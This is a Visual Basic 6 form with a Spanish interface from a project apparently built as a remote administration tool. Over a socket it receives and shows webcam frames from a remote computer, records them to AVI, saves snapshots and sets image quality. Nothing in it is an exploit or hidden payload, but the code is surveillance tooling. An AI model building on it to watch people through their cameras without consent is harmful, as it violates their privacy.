VERSION 5.00
Begin VB.Form FrmWebCam 
   BackColor       =   &H00000000&
   Caption         =   "Remote Webcam"
   ClientHeight    =   7890
   ClientLeft      =   60
   ClientTop       =   495
   ClientWidth     =   9915
   Icon            =   "FrmWebCam.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   7890
   ScaleWidth      =   9915
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer1 
      Left            =   600
      Top             =   4080
   End
   Begin Servidor.ucToolbar ucToolbar1 
      Align           =   1  'Align Top
      Height          =   495
      Left            =   0
      Top             =   0
      Width           =   9915
      _ExtentX        =   17489
      _ExtentY        =   873
   End
   Begin VB.Label LblIcon 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "ll"
      BeginProperty Font 
         Name            =   "Arial Black"
         Size            =   20.25
         Charset         =   0
         Weight          =   900
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   570
      Left            =   360
      TabIndex        =   1
      Top             =   650
      Visible         =   0   'False
      Width           =   270
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "PAUSA"
      BeginProperty Font 
         Name            =   "Arial Black"
         Size            =   18
         Charset         =   0
         Weight          =   900
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   495
      Left            =   720
      TabIndex        =   0
      Top             =   675
      Visible         =   0   'False
      Width           =   1380
   End
   Begin VB.Shape Shape1 
      BorderColor     =   &H0000FF00&
      Height          =   495
      Left            =   240
      Shape           =   4  'Rounded Rectangle
      Top             =   700
      Visible         =   0   'False
      Width           =   1935
   End
End
Attribute VB_Name = "FrmWebCam"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Public ParentID As Long
Public SocketID As Long
Private m_Data As String
Private cAviCreator As ClsAviCreator
Private m_IsInRec As Boolean
Private StPic As StdPicture
Private m_ViewMode As Long
Private m_SaveImagePath As String

Private Sub Form_Load()
    With ucToolbar1
    
        m_ViewMode = 2
        
        Call .Initialize(ImageSize:=24, FlatStyle:=True, ListStyle:=True, Divider:=True)
        Call .AddBitmap(LoadResPicture(7, vbResBitmap))
        
        Call .AddButton(, 3, "Rec", eNormal)
        Call .AddButton(, 2, "Stop", eNormal)
        Call .AddButton(, , , [eSeparator])
        Call .AddButton(, 4, "Guardar Imagen")
        Call .AddButton(, 5, "Imprimir")
        Call .AddButton(, , , [eSeparator])
        Call .AddButton(, 6, "Calidad", eWholeDropDown)
      
            

        .ButtonEnabled(2) = False
        .ButtonEnabled(3) = False
        .Tansparent = True
        .UseThemeReBar = True

        Let .Height = .ToolbarHeight * Screen.TwipsPerPixelY
    End With
        
    Me.AutoRedraw = True
    WinSock32.SendData SocketID, "0" & Delimiter & END_DATA
    
    MdlINI.ReadFormPosAndSize Me
End Sub

Public Sub Socket_Conect(id As Long, IP As String, Puerto As String)

End Sub

Public Sub Socket_DataArrival(id As Long, IP As String, Puerto As String, Data As String)
    On Error GoTo ErrHaddle
    
    Dim lRet1       As Long
    Dim lRet2       As Long
    Dim sCommand    As String
    Dim sBuf        As String
    
    
    m_Data = m_Data & Data

    lRet1 = InStr(m_Data, END_DATA)
    
    If lRet1 Then
   
        sBuf = Left$(m_Data, lRet1 - 1)
        m_Data = Mid$(m_Data, lRet1 + Len(END_DATA))

        lRet2 = InStr(sBuf, Delimiter)
        sCommand = Left(sBuf, lRet2 - 1)
        sBuf = Mid(sBuf, lRet2 + 1)

        Select Case sCommand
        
            Case 0
                Dim ArrImage() As Byte
                
                ArrImage = StrConv(sBuf, vbFromUnicode)
                
                If Len(m_SaveImagePath) Then
                    Dim FF          As Integer
                    FF = FreeFile
                    Open m_SaveImagePath For Binary As #FF
                        Put #FF, , ArrImage
                    Close #FF
                    m_SaveImagePath = vbNullString
                End If
                

                
                Me.Cls
                Set StPic = LoadPictureFromStream(ArrImage)
                
                If Not StPic Is Nothing Then
                    If m_IsInRec Then
                        Call cAviCreator.WriteFrame(StPic.Handle)
                    End If
                
                    'Me.PaintPicture StPic, 0, 0, Me.ScaleWidth, Me.ScaleHeight
                    Render StPic
                
                End If
                
                Me.Refresh
        End Select
        
        If Len(m_Data) Then
            If InStr(m_Data, END_DATA) Then Call Me.Socket_DataArrival(id, IP, Puerto, vbNullString)
        End If
        
    End If
    
ErrHaddle:
End Sub

Public Sub Socket_Close(id As Long, IP As String, Puerto As String)
    Me.Caption = "Remote Webcam - Sin Conexión"
    ucToolbar1_ButtonClick 2
    ucToolbar1.Enabled = False
    Me.Cls
    TerminateConnection SocketID
    SocketID = 0
End Sub

Private Sub Form_Unload(Cancel As Integer)
    If SocketID Then
        Call WinSock32.SendData(SocketID, "1" & Delimiter & END_DATA)
     
        TerminateConnection SocketID
        WinSock32.WsClose SocketID
        If Not cAviCreator Is Nothing Then
            cAviCreator.CloseAviFile
        End If
    End If
    MdlINI.SaveFormPosAndSize Me
End Sub


Private Sub Timer1_Timer()
    Label1.Visible = Not Label1.Visible
    Shape1.Visible = Not Shape1.Visible
    LblIcon.Visible = Not LblIcon.Visible
End Sub

Private Sub ucToolbar1_ButtonClick(ByVal Button As Long)
    On Error GoTo Handler
    
    Dim sDestPath As String
    Dim TemPic As StdPicture
    Select Case Button
        Case 1
        
            If cAviCreator Is Nothing Then
                 If Not StPic Is Nothing Then
                    Set TemPic = StPic
                    sDestPath = ShowSaveFile(Me.hwnd, "Video1.Avi")
                     
                    If Len(sDestPath) Then
                        Set cAviCreator = New ClsAviCreator
                        If cAviCreator.CreateAviFile(sDestPath, TemPic, 3, True, Me.hwnd) Then
                            Call Rec
                            ucToolbar1.ButtonEnabled(2) = True
                            Timer1.Enabled = True
                            Timer1.Interval = 500
                        Else
                            Set cAviCreator = Nothing
                            'MsgBox "Error, no se pudo inciar la grabación", vbCritical
                            MsgBox err.Description
                        End If
                    End If
                End If
            Else
                If m_IsInRec Then
                    Call Pausa
                Else
                    Call Rec
                End If
            End If
                            
        Case 2
            ucToolbar1.ButtonEnabled(2) = False
            If Not cAviCreator Is Nothing Then
                m_IsInRec = False
                cAviCreator.CloseAviFile
                Set cAviCreator = Nothing
                ucToolbar1.ButtonImage(1) = 3
                Timer1.Enabled = False
                Timer1.Interval = 0
                Label1.Visible = False
                Shape1.Visible = False
                LblIcon.Visible = False
            End If
        Case 4
             sDestPath = ShowSaveFile(Me.hwnd, "Captura1.Jpg")
             If Len(sDestPath) Then
                If Len(Dir(sDestPath, vbArchive)) Then Kill sDestPath
                m_SaveImagePath = sDestPath
            End If
            
        Case 5
            If Not StPic Is Nothing Then
                Set TemPic = StPic
                Printer.PaintPicture TemPic, 0, 0, TemPic.Width, TemPic.Height
                Printer.EndDoc
            End If
    End Select
    
    Exit Sub
Handler:
    MsgBox err.Description, vbCritical, "Error: " & err.Number
End Sub

Public Function Render(ByVal Img As StdPicture)

    Dim pLeft As Long, pTop As Long
    Dim ReqWidth As Long, ReqHeight As Long
    Dim HScale As Double, VScale As Double
    Dim MyScale As Double
    Dim ImgWidth As Long
    Dim ImgHeight As Long


    ImgWidth = Me.ScaleX(Img.Width, vbHimetric, vbPixels)
    ImgHeight = Me.ScaleY(Img.Height, vbHimetric, vbPixels)

    HScale = Me.ScaleWidth / ImgWidth
    VScale = (Me.ScaleHeight - ucToolbar1.Height) / ImgHeight

    MyScale = IIf(VScale >= HScale, HScale, VScale)
    
    ReqWidth = ImgWidth * MyScale
    ReqHeight = ImgHeight * MyScale
    
    pLeft = (Me.ScaleWidth - ReqWidth) / 2
    pTop = (ucToolbar1.Height / 2) + (Me.ScaleHeight - ReqHeight) / 2

    Me.PaintPicture Img, pLeft, pTop, ReqWidth, ReqHeight
    

End Function


Private Sub Rec()
    m_IsInRec = True
    With LblIcon
    .Font.Size = 40
    .Caption = "•"
    .Top = 350
    .ForeColor = vbRed
    End With
    
    With Label1
        .Caption = "REC"
        .ForeColor = vbRed
    End With
    
    With Shape1
        .BorderColor = vbRed
        .Width = 1450
    End With
    
    ucToolbar1.ButtonImage(1) = 0
    ucToolbar1.ButtonTipText(1) = "Pausa"
    m_IsInRec = True
    Timer1.Enabled = True
End Sub

Private Sub Pausa()
    Timer1.Enabled = False
    ucToolbar1.ButtonImage(1) = 3
    ucToolbar1.ButtonTipText(1) = "Rec"
    m_IsInRec = False

    With LblIcon
        .Font.Size = 20
        .Caption = "ll"
        .Top = 650
        .ForeColor = vbGreen
        .Visible = True
    End With
    
    With Label1
        .Caption = "PAUSA"
        .ForeColor = vbGreen
        .Visible = True
    End With
    
    With Shape1
        .BorderColor = vbGreen
        .Width = 1935
        .Visible = True
    End With
    
End Sub


Private Function ShowMenuViewMode(ByVal X As Long, Y As Long) As Long
    
    Dim hMenu As Long
    
    hMenu = CreatePopupMenu()
    AppendMenu hMenu, MF_STRING, 1, "Baja"
    AppendMenu hMenu, MF_STRING, 2, "Media"
    AppendMenu hMenu, MF_STRING, 3, "Alta"

    
    Call CheckMenuRadioItem(hMenu, m_ViewMode - 1, 2, m_ViewMode - 1, &H400)
    ShowMenuViewMode = TrackPopupMenuEx(hMenu, TPM_RETURNCMD, X, Y, Me.hwnd, ByVal 0&)
    
    DestroyMenu hMenu
    
End Function

Private Sub ucToolbar1_ButtonDropDown(ByVal Button As Long, ByVal X As Long, ByVal Y As Long)
    Dim lRet As Long
    Dim PT As POINTAPI
    Dim JpgQuality As Long
   
    ClientToScreen Me.hwnd, PT
    
    X = PT.X + X / Screen.TwipsPerPixelX
    Y = PT.Y + Y / Screen.TwipsPerPixelY
    
    lRet = ShowMenuViewMode(X, Y)
    If lRet Then
        m_ViewMode = lRet
        JpgQuality = 30 * lRet
        WinSock32.SendData SocketID, "2" & Delimiter & JpgQuality & END_DATA
    End If
End Sub
